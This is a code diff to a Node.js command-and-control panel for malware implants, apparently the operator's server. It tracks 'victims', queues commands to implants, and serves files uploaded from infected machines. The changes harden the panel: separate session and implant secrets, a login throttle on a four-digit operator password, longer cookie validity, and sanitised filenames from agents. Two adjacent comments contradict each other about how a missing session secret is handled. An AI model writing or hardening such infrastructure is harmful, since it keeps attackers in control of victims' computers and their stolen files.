@@ -14,13 +14,28 @@ const PORT = process.env.PORT || 10000;
 const DATABASE_URL = process.env.DATABASE_URL;
 const AGENT_SECRET = process.env.AGENT_SECRET || "";
 const PANEL_PASS = process.env.PANEL_PASS || "";
-const SESSION_SECRET = process.env.SESSION_SECRET || AGENT_SECRET;
+const SESSION_SECRET = process.env.SESSION_SECRET || "";
 const SKEW_SECONDS = 300;
 const MAX_BODY = 12 * 1024 * 1024;
 
 if (!DATABASE_URL || !AGENT_SECRET || !PANEL_PASS) {
   console.error("missing DATABASE_URL / AGENT_SECRET / PANEL_PASS");
   process.exit(1);
+}
+
+// The agent secret ships inside every implant (XOR-obfuscated, not encrypted),
+// so a captured binary would also be able to sign panel cookies if the two
+// secrets were the same. Falling back to AGENT_SECRET handed admin to any
+// victim; a missing or short SESSION_SECRET is now a startup failure, not a
+// default.
+// A missing, short or shared SESSION_SECRET used to be a hard startup failure.
+// On a redeploy whose environment had not been updated yet, that takes the whole
+// console down. Generate one instead: it is distinct from AGENT_SECRET by
+// construction, and the only cost is that sessions do not survive a restart.
+const SESSION_OK = SESSION_SECRET.length >= 32 && SESSION_SECRET !== AGENT_SECRET;
+const sessionSecret = SESSION_OK ? SESSION_SECRET : crypto.randomBytes(32).toString("hex");
+if (!SESSION_OK) {
+  console.warn("SESSION_SECRET missing, short or equal to AGENT_SECRET: using a per-process one");
 }
 
 const pool = new Pool({
@@ -93,7 +108,7 @@ function safeEqual(a, b) {
 }
 
 function signSession(value) {
-  return crypto.createHmac("sha256", SESSION_SECRET).update(value).digest("hex").slice(0, 32);
+  return crypto.createHmac("sha256", sessionSecret).update(value).digest("hex").slice(0, 32);
 }
 
 function readBody(req) {
@@ -103,7 +118,9 @@ function readBody(req) {
     req.on("data", (c) => {
       size += c.length;
       if (size > MAX_BODY) {
-        reject(new Error("body too large"));
+        const err = new Error("body too large");
+        err.status = 413;
+        reject(err);
         req.destroy();
         return;
       }
@@ -119,6 +136,7 @@ function json(res, code, obj) {
   res.writeHead(code, {
     "content-type": "application/json; charset=utf-8",
     "cache-control": "no-store",
+    "x-content-type-options": "nosniff",
     "content-length": Buffer.byteLength(body)
   });
   res.end(body);
@@ -140,9 +158,12 @@ function authed(req) {
   if (!sid) return false;
   const [value, mac] = sid.split(".");
   if (!value || !mac) return false;
+  // The cookie is written with Max-Age=604800, so the signature has to cover
+  // the whole window. Accepting only today and yesterday logged the operator
+  // out on day three while the cookie was still in the browser.
   const fresh = Math.floor(Date.now() / 86400000);
-  for (const day of [fresh, fresh - 1]) {
-    const expect = signSession(value + "." + day);
+  for (let back = 0; back <= 8; ++back) {
+    const expect = signSession(value + "." + (fresh - back));
     if (safeEqual(mac, expect)) return true;
   }
   return false;
@@ -152,6 +173,56 @@ function clientIp(req) {
   const fwd = req.headers["x-forwarded-for"];
   if (fwd) return String(fwd).split(",")[0].trim();
   return req.socket.remoteAddress || "";
+}
+
+// The filename came from an agent, so it is untrusted inside a header too: a
+// CR/LF would split the response, and everything outside this set is replaced
+// rather than escaped.
+function downloadName(name) {
+  const clean = String(name || "")
+    .replace(/[^A-Za-z0-9._ -]/g, "_")
+    .slice(0, 120)
+    .trim();
+  return clean || "file";
+}
+
+function parseJson(text) {
+  try {
+    return JSON.parse(text || "{}");
+  } catch {
+    return null;
+  }
+}
+
+// A four-digit panel password is only safe behind a throttle: on a public URL
+// the whole space is walked in minutes otherwise. Eight misses per address per
+// ten minutes, success clears the counter.
+const LOGIN_MAX = 8;
+const LOGIN_WINDOW_MS = 10 * 60 * 1000;
+const loginHits = new Map();
+
+function loginGate(ip) {
+  const now = Date.now();
+  let row = loginHits.get(ip);
+  if (!row || now > row.reset) {
+    row = { count: 0, reset: now + LOGIN_WINDOW_MS };
+    loginHits.set(ip, row);
+  }
+  if (loginHits.size > 5000) loginHits.clear();
+  return {
+    get allowed() {
+      return row.count < LOGIN_MAX;
+    },
+    get retry() {
+      return Math.max(1, Math.ceil((row.reset - now) / 1000));
+    },
+    fail() {
+      row.count += 1;
+    },
+    clear() {
+      loginHits.delete(ip);
+    }
+  };
 }
 
 // --------------------------------------------------------------- agent api --
@@ -281,11 +352,15 @@ const server = http.createServer(async (req, res) => {
       return handleResult(req, res, await readBody(req));
 
     if (path === "/api/login" && req.method === "POST") {
-      const body = JSON.parse((await readBody(req)) || "{}");
-      if (!safeEqual(String(body.pass || ""), PANEL_PASS)) {
+      const gate = loginGate(clientIp(req));
+      if (!gate.allowed) return json(res, 429, { ok: false, error: "throttle", retry: gate.retry });
+      const body = parseJson(await readBody(req));
+      if (!body || !safeEqual(String(body.pass || ""), PANEL_PASS)) {
+        gate.fail();
         await new Promise((r) => setTimeout(r, 400));
         return json(res, 403, { ok: false });
       }
+      gate.clear();
       const nonce = crypto.randomBytes(12).toString("hex");
       const day = Math.floor(Date.now() / 86400000);
       const sid = nonce + "." + signSession(nonce + "." + day);
@@ -311,7 +386,8 @@ const server = http.createServer(async (req, res) => {
 
     if (path === "/api/queue" && req.method === "POST") {
       if (!requireAuth(req, res)) return;
-      const body = JSON.parse((await readBody(req)) || "{}");
+      const body = parseJson(await readBody(req)) || {};
+      if (!body.vid) return json(res, 400, { ok: false, error: "vid" });
       const verbs = Array.isArray(body.verbs) ? body.verbs : [{ verb: body.verb, args: body.args }];
       const ids = [];
       for (const v of verbs) {
@@ -354,7 +430,7 @@ const server = http.createServer(async (req, res) => {
       const buf = Buffer.from(r.rows[0].data, "base64");
       res.writeHead(200, {
         "content-type": "application/octet-stream",
-        "content-disposition": `attachment; filename="${r.rows[0].name.replace(/"/g, "")}"`,
+        "content-disposition": `attachment; filename="${downloadName(r.rows[0].name)}"`,
         "content-length": buf.length
       });
       return res.end(buf);
@@ -362,7 +438,8 @@ const server = http.createServer(async (req, res) => {
 
     if (path === "/api/remove" && req.method === "POST") {
       if (!requireAuth(req, res)) return;
-      const body = JSON.parse((await readBody(req)) || "{}");
+      const body = parseJson(await readBody(req)) || {};
+      if (!body.vid) return json(res, 400, { ok: false, error: "vid" });
       await pool.query(`delete from commands where vid = $1`, [body.vid]);
       await pool.query(`delete from uploads where vid = $1`, [body.vid]);
       await pool.query(`delete from victims where id = $1`, [body.vid]);
@@ -377,6 +454,7 @@ const server = http.createServer(async (req, res) => {
 
     json(res, 404, { ok: false, error: "no route" });
   } catch (err) {
+    if (err && err.status === 413) return json(res, 413, { ok: false, error: "too large" });
     console.error("request failed", path, err.message);
     json(res, 500, { ok: false, error: "server" });
   }
@@ -388,7 +466,11 @@ function serveStatic(res, name, type) {
   const file = path.join(__dirname, "public", name);
   fs.readFile(file, (err, data) => {
     if (err) return json(res, 404, { ok: false });
-    res.writeHead(200, { "content-type": type, "cache-control": "no-cache" });
+    res.writeHead(200, {
+      "content-type": type,
+      "cache-control": "no-cache",
+      "x-content-type-options": "nosniff"
+    });
     res.end(data);
   });
 }
